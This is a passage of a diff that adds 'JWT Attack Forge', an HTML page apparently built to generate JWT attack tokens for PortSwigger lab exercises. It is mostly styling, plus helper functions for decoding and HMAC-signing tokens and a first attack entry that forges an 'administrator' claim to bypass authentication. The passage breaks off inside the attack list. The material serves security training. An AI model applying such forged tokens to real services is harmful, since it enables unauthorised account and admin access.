@@ -1,0 +1,1871 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Attack Forge — PortSwigger Lab Payload Generator</title>
+    <meta name="description"
+        content="Generate JWT attack payloads for PortSwigger Web Security Academy labs. Supports all 8 JWT attack vectors including alg:none, weak key, JWK/JKU injection, KID traversal, and algorithm confusion.">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: #111827;
+            --bg-card: rgba(17, 24, 39, 0.7);
+            --bg-glass: rgba(255, 255, 255, 0.03);
+            --border-glass: rgba(255, 255, 255, 0.08);
+            --accent-primary: #6366f1;
+            --accent-secondary: #8b5cf6;
+            --accent-glow: rgba(99, 102, 241, 0.3);
+            --accent-red: #ef4444;
+            --accent-red-glow: rgba(239, 68, 68, 0.3);
+            --accent-green: #22c55e;
+            --accent-green-glow: rgba(34, 197, 94, 0.3);
+            --accent-amber: #f59e0b;
+            --accent-amber-glow: rgba(245, 158, 11, 0.3);
+            --accent-cyan: #06b6d4;
+            --accent-cyan-glow: rgba(6, 182, 212, 0.3);
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --font-sans: 'Inter', -apple-system, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+            --radius: 16px;
+            --radius-sm: 10px;
+            --radius-xs: 6px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--font-sans);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Animated background */
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            background-image:
+                radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99, 102, 241, 0.12), transparent),
+                radial-gradient(ellipse 60% 40% at 80% 60%, rgba(139, 92, 246, 0.08), transparent),
+                radial-gradient(ellipse 50% 30% at 10% 80%, rgba(6, 182, 212, 0.06), transparent);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bg-grid::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image: linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+
+        /* Floating orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 0;
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: rgba(99, 102, 241, 0.08);
+            top: -100px;
+            right: -100px;
+        }
+
+        .orb-2 {
+            width: 300px;
+            height: 300px;
+            background: rgba(139, 92, 246, 0.06);
+            bottom: 10%;
+            left: -80px;
+            animation-delay: -7s;
+        }
+
+        .orb-3 {
+            width: 250px;
+            height: 250px;
+            background: rgba(6, 182, 212, 0.05);
+            top: 40%;
+            right: 10%;
+            animation-delay: -14s;
+        }
+
+        @keyframes orbFloat {
+
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+
+            33% {
+                transform: translate(30px, -40px) scale(1.05);
+            }
+
+            66% {
+                transform: translate(-20px, 20px) scale(0.95);
+            }
+        }
+
+        /* Header */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(20px) saturate(1.5);
+            -webkit-backdrop-filter: blur(20px) saturate(1.5);
+            background: rgba(10, 14, 26, 0.75);
+            border-bottom: 1px solid var(--border-glass);
+            padding: 0 2rem;
+        }
+
+        .header-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 68px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+            box-shadow: 0 4px 16px var(--accent-glow);
+            animation: logoPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes logoPulse {
+
+            0%,
+            100% {
+                box-shadow: 0 4px 16px var(--accent-glow);
+            }
+
+            50% {
+                box-shadow: 0 4px 28px var(--accent-glow), 0 0 40px rgba(99, 102, 241, 0.15);
+            }
+        }
+
+        .logo-text {
+            font-size: 1.25rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f1f5f9, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.02em;
+        }
+
+        .logo-badge {
+            font-size: 0.65rem;
+            font-weight: 600;
+            background: rgba(239, 68, 68, 0.15);
+            color: var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            padding: 2px 8px;
+            border-radius: 20px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .github-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.82rem;
+            font-weight: 500;
+            padding: 6px 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border-glass);
+            transition: all 0.25s;
+        }
+
+        .github-link:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+            background: rgba(99, 102, 241, 0.08);
+        }
+
+        /* Main Container */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 3rem 0 2.5rem;
+        }
+
+        .hero h1 {
+            font-size: clamp(2rem, 4vw, 3rem);
+            font-weight: 800;
+            letter-spacing: -0.04em;
+            line-height: 1.15;
+            margin-bottom: 0.75rem;
+            background: linear-gradient(135deg, #f1f5f9 0%, #c7d2fe 40%, #a78bfa 70%, #6366f1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.05rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        /* Input Section */
+        .input-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 1.75rem;
+            backdrop-filter: blur(12px);
+            margin-bottom: 2rem;
+            transition: border-color 0.3s;
+        }
+
+        .input-section:focus-within {
+            border-color: rgba(99, 102, 241, 0.3);
+            box-shadow: 0 0 40px rgba(99, 102, 241, 0.06);
+        }
+
+        .section-label {
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-label .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-primary);
+        }
+
+        .jwt-input {
+            width: 100%;
+            min-height: 120px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-sm);
+            padding: 1rem;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            line-height: 1.7;
+            resize: vertical;
+            transition: all 0.3s;
+            word-break: break-all;
+        }
+
+        .jwt-input:focus {
+            outline: none;
+            border-color: rgba(99, 102, 241, 0.4);
+            box-shadow: inset 0 0 20px rgba(99, 102, 241, 0.05);
+        }
+
+        .jwt-input::placeholder {
+            color: var(--text-muted);
+            font-family: var(--font-sans);
+            font-size: 0.85rem;
+        }
+
+        /* Decoded Display */
+        .decoded-container {
+            display: none;
+            margin-top: 1.25rem;
+            gap: 1rem;
+        }
+
+        .decoded-container.visible {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .decoded-box {
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            padding: 1rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .decoded-box-label {
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .decoded-box-label.header-label {
+            color: var(--accent-cyan);
+        }
+
+        .decoded-box-label.payload-label {
+            color: var(--accent-amber);
+        }
+
+        .decoded-json {
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            line-height: 1.7;
+            color: var(--text-secondary);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* Attack Cards Grid */
+        .attacks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .attack-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 1.5rem;
+            cursor: pointer;
+            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(8px);
+        }
+
+        .attack-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--card-accent, var(--accent-primary)), transparent);
+            opacity: 0;
+            transition: opacity 0.35s;
+        }
+
+        .attack-card:hover {
+            border-color: rgba(99, 102, 241, 0.25);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3), 0 0 30px var(--accent-glow);
+        }
+
+        .attack-card:hover::before {
+            opacity: 1;
+        }
+
+        .attack-card.selected {
+            border-color: var(--accent-primary);
+            background: rgba(99, 102, 241, 0.06);
+            box-shadow: 0 0 30px var(--accent-glow);
+        }
+
+        .attack-card.selected::before {
+            opacity: 1;
+        }
+
+        .card-top {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .card-difficulty {
+            font-size: 0.62rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            padding: 3px 10px;
+            border-radius: 20px;
+            white-space: nowrap;
+        }
+
+        .difficulty-apprentice {
+            background: rgba(34, 197, 94, 0.12);
+            color: var(--accent-green);
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+
+        .difficulty-practitioner {
+            background: rgba(245, 158, 11, 0.12);
+            color: var(--accent-amber);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+        }
+
+        .difficulty-expert {
+            background: rgba(239, 68, 68, 0.12);
+            color: var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .card-status {
+            font-size: 0.62rem;
+            font-weight: 600;
+            padding: 3px 10px;
+            border-radius: 20px;
+        }
+
+        .status-solved {
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--accent-green);
+            border: 1px solid rgba(34, 197, 94, 0.15);
+        }
+
+        .status-unsolved {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.15);
+        }
+
+        .card-number {
+            font-size: 2rem;
+            font-weight: 800;
+            color: rgba(99, 102, 241, 0.15);
+            line-height: 1;
+            margin-bottom: 4px;
+        }
+
+        .card-title {
+            font-size: 0.92rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .card-desc {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .card-algo-tag {
+            display: inline-block;
+            font-size: 0.65rem;
+            font-weight: 600;
+            font-family: var(--font-mono);
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--accent-primary);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+
+        /* Attack Configuration Panel */
+        .config-panel {
+            display: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 2rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(12px);
+            animation: slideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .config-panel.visible {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .config-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .config-subtitle {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+            max-width: 700px;
+        }
+
+        .config-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .config-field {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .config-field.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .config-field label {
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-secondary);
+        }
+
+        .config-field input,
+        .config-field textarea,
+        .config-field select {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-xs);
+            padding: 10px 14px;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            transition: all 0.3s;
+        }
+
+        .config-field input:focus,
+        .config-field textarea:focus,
+        .config-field select:focus {
+            outline: none;
+            border-color: rgba(99, 102, 241, 0.4);
+        }
+
+        .config-field select {
+            cursor: pointer;
+        }
+
+        .config-field select option {
+            background: var(--bg-secondary);
+        }
+
+        .config-field textarea {
+            resize: vertical;
+            min-height: 80px;
+            line-height: 1.6;
+        }
+
+        .config-hint {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-top: 2px;
+        }
+
+        .generate-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 32px;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-family: var(--font-sans);
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 16px var(--accent-glow);
+        }
+
+        .generate-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px var(--accent-glow);
+        }
+
+        .generate-btn:active {
+            transform: translateY(0);
+        }
+
+        .generate-btn .icon {
+            font-size: 1.1rem;
+        }
+
+        .sample-btn {
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            color: var(--accent-primary);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-left: auto;
+        }
+
+        .sample-btn:hover {
+            background: rgba(99, 102, 241, 0.2);
+            border-color: var(--accent-primary);
+        }
+
+        .label-row {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 12px;
+        }
+
+        /* Output Section */
+        .output-section {
+            display: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 2rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(12px);
+            animation: slideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .output-section.visible {
+            display: block;
+        }
+
+        .output-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .output-title {
+            font-size: 1rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 18px;
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--accent-green);
+            border: 1px solid rgba(34, 197, 94, 0.25);
+            border-radius: var(--radius-xs);
+            font-family: var(--font-sans);
+            font-size: 0.78rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+
+        .copy-btn:hover {
+            background: rgba(34, 197, 94, 0.2);
+            box-shadow: 0 0 20px var(--accent-green-glow);
+        }
+
+        .copy-btn.copied {
+            background: rgba(34, 197, 94, 0.25);
+        }
+
+        .output-token {
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: var(--radius-sm);
+            padding: 1.25rem;
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            line-height: 1.8;
+            color: var(--accent-green);
+            word-break: break-all;
+            white-space: pre-wrap;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .output-token::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .output-token::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .output-token::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+        }
+
+        /* Decoded Output */
+        .output-decoded {
+            margin-top: 1.25rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .output-decoded-box {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            padding: 1rem;
+        }
+
+        .output-decoded-label {
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+        }
+
+        .output-decoded-label.modified {
+            color: var(--accent-red);
+        }
+
+        .output-decoded-label.original {
+            color: var(--accent-cyan);
+        }
+
+        .output-decoded-json {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            line-height: 1.7;
+            color: var(--text-secondary);
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* Attack Steps */
+        .attack-steps {
+            margin-top: 1.25rem;
+            background: rgba(0, 0, 0, 0.15);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            padding: 1.25rem;
+        }
+
+        .steps-title {
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--accent-amber);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 10px;
+            font-size: 0.82rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .step-num {
+            flex-shrink: 0;
+            width: 22px;
+            height: 22px;
+            background: rgba(99, 102, 241, 0.15);
+            color: var(--accent-primary);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: 700;
+        }
+
+        /* Warning Banner */
+        .warning-banner {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid rgba(239, 68, 68, 0.15);
+            border-radius: var(--radius-sm);
+            padding: 1rem 1.25rem;
+            margin-top: 1.25rem;
+        }
+
+        .warning-icon {
+            font-size: 1.2rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .warning-text {
+            font-size: 0.78rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .warning-text strong {
+            color: var(--accent-red);
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            backdrop-filter: blur(16px);
+            border-radius: var(--radius-sm);
+            padding: 12px 20px;
+            font-size: 0.82rem;
+            font-weight: 500;
+            color: var(--accent-green);
+            z-index: 999;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: var(--text-muted);
+            font-size: 0.78rem;
+            border-top: 1px solid var(--border-glass);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .attacks-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .config-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .output-decoded {
+                grid-template-columns: 1fr;
+            }
+
+            .decoded-container.visible {
+                grid-template-columns: 1fr;
+            }
+
+            .header-inner {
+                padding: 0;
+            }
+        }
+
+        /* Highlight changes */
+        .highlight-change {
+            color: var(--accent-red);
+            font-weight: 600;
+        }
+
+        /* Wordlist display */
+        .wordlist-status {
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--radius-xs);
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        .info-box {
+            background: rgba(99, 102, 241, 0.06);
+            border: 1px solid rgba(99, 102, 241, 0.15);
+            border-radius: var(--radius-sm);
+            padding: 1rem 1.25rem;
+            margin-top: 1rem;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .info-box strong {
+            color: var(--accent-primary);
+        }
+
+        /* Claim Builder UI */
+        .claims-builder {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .claim-row {
+            display: grid;
+            grid-template-columns: 140px 1fr 40px;
+            gap: 8px;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .claim-key-container {
+            position: relative;
+            width: 140px;
+        }
+
+        .claim-key-select,
+        .claim-key-custom {
+            width: 100%;
+        }
+
+        .claim-key-custom {
+            display: none;
+        }
+
+        .claim-row select,
+        .claim-row input {
+            background: rgba(0, 0, 0, 0.3) !important;
+            border: 1px solid rgba(255, 255, 255, 0.06) !important;
+            border-radius: var(--radius-xs) !important;
+            padding: 8px 12px !important;
+            color: var(--text-primary) !important;
+            font-family: var(--font-mono) !important;
+            font-size: 0.8rem !important;
+        }
+
+        .remove-claim-btn {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: all 0.2s;
+        }
+
+        .remove-claim-btn:hover {
+            background: rgba(239, 68, 68, 0.2);
+            transform: scale(1.1);
+        }
+
+        .add-claim-btn {
+            align-self: flex-start;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--accent-primary);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: all 0.2s;
+        }
+
+        .add-claim-btn:hover {
+            background: rgba(99, 102, 241, 0.2);
+            border-color: var(--accent-primary);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="bg-grid"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-inner">
+            <div class="logo">
+                <div class="logo-icon">⚡</div>
+                <span class="logo-text">JWT Attack Forge</span>
+                <span class="logo-badge">Security Lab</span>
+            </div>
+            <div class="header-right">
+                <a href="https://portswigger.net/web-security/jwt" target="_blank" class="github-link">📖 PortSwigger
+                    Docs</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <!-- Hero -->
+        <section class="hero">
+            <h1>JWT Attack Payload Generator</h1>
+            <p>Paste your JWT token, pick an attack vector from PortSwigger labs, configure parameters, and get a
+                ready-to-use attack payload.</p>
+        </section>
+
+        <!-- JWT Input -->
+        <section class="input-section" id="inputSection">
+            <div class="label-row">
+                <div class="section-label" style="margin-bottom: 0;"><span class="dot"></span> Paste Your JWT Token</div>
+                <button class="sample-btn" onclick="loadSample()">📋 Load Sample JWT</button>
+            </div>
+            <textarea class="jwt-input" id="jwtInput"
+                placeholder="eyJhbGciOiJSUzI1NiIsImtpZCI6IjkxMzZkZGIzLWNiMGEtNGExOS1hMDdlLWVhZGY1YTQ0YzhiNSJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY0ODAzNzE2NH0.signature..."
+                spellcheck="false"></textarea>
+            <div class="decoded-container" id="decodedContainer">
+                <div class="decoded-box">
+                    <div class="decoded-box-label header-label">⚙ Header</div>
+                    <div class="decoded-json" id="decodedHeader"></div>
+                </div>
+                <div class="decoded-box">
+                    <div class="decoded-box-label payload-label">📦 Payload</div>
+                    <div class="decoded-json" id="decodedPayload"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Attack Cards -->
+        <div class="section-label" style="margin-bottom: 1rem; padding-left: 4px;"><span class="dot"></span> Select
+            Attack Vector</div>
+        <div class="attacks-grid" id="attacksGrid">
+            <!-- Cards injected by JS -->
+        </div>
+
+        <!-- Config Panel -->
+        <div class="config-panel" id="configPanel">
+            <div class="config-title" id="configTitle"></div>
+            <div class="config-subtitle" id="configSubtitle"></div>
+            <div class="config-grid" id="configFields"></div>
+            <button class="generate-btn" id="generateBtn" onclick="generatePayload()">
+                <span class="icon">🔥</span> Generate Attack Payload
+            </button>
+        </div>
+
+        <!-- Output -->
+        <div class="output-section" id="outputSection">
+            <div class="output-header">
+                <div class="output-title">🎯 Generated Attack Payload</div>
+                <button class="copy-btn" id="copyBtn" onclick="copyPayload()">📋 Copy Token</button>
+            </div>
+            <div class="output-token" id="outputToken"></div>
+            <div class="output-decoded" id="outputDecoded"></div>
+            <div class="attack-steps" id="attackSteps"></div>
+            <div class="warning-banner">
+                <span class="warning-icon">⚠️</span>
+                <div class="warning-text">
+                    <strong>Educational Use Only.</strong> Use these payloads only in authorized lab environments like
+                    PortSwigger Web Security Academy. Unauthorized access to computer systems is illegal.
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            JWT Attack Forge — Built for PortSwigger Web Security Academy Labs · For educational and authorized testing
+            only.
+        </footer>
+    </main>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">✅ Payload copied to clipboard!</div>
+
+    <script>
+        // ========== BASE64URL HELPERS ==========
+        function base64UrlEncode(str) {
+            return btoa(str)
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=+$/, '');
+        }
+
+        function base64UrlDecode(str) {
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            while (str.length % 4) str += '=';
+            try {
+                return atob(str);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ========== HMAC-SHA256 (Web Crypto API) ==========
+        async function hmacSha256Sign(message, secret) {
+            const encoder = new TextEncoder();
+            const keyData = encoder.encode(secret);
+            const msgData = encoder.encode(message);
+
+            const key = await crypto.subtle.importKey(
+                'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
+            );
+            const sig = await crypto.subtle.sign('HMAC', key, msgData);
+            const bytes = new Uint8Array(sig);
+            let binary = '';
+            bytes.forEach(b => binary += String.fromCharCode(b));
+            return base64UrlEncode(binary);
+        }
+
+        // ========== JWT DECODE ==========
+        function decodeJWT(token) {
+            const parts = token.trim().split('.');
+            if (parts.length < 2) return null;
+            const headerStr = base64UrlDecode(parts[0]);
+            const payloadStr = base64UrlDecode(parts[1]);
+            if (!headerStr || !payloadStr) return null;
+            try {
+                return {
+                    header: JSON.parse(headerStr),
+                    payload: JSON.parse(payloadStr),
+                    signature: parts[2] || '',
+                    raw: { header: parts[0], payload: parts[1], signature: parts[2] || '' }
+                };
+            } catch (e) { return null; }
+        }
+
+        // ========== ATTACK DEFINITIONS ==========
+        const attacks = [
+            {
+                id: 'unverified_sig',
+                num: '01',
+                title: 'Unverified Signature',
+                subtitle: 'JWT authentication bypass via unverified signature',
+                difficulty: 'apprentice',
+                status: 'solved',
+                algo: 'ANY',
+                desc: 'Modify payload claims (e.g. sub → administrator) without changing signature. Works when server uses decode() instead of verify().',
+                fields: [
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional: {"isAdmin": true, "role": "admin"} — merged into payload last' }
+                ],
+                steps: [
+                    'Decode the original JWT token',
+                    'Modify the "sub" claim to "administrator" (or target user)',
+                    'Keep the original signature unchanged',
+                    'Replace the token in the session cookie or Authorization header',
+                    'Access /admin or protected endpoint'
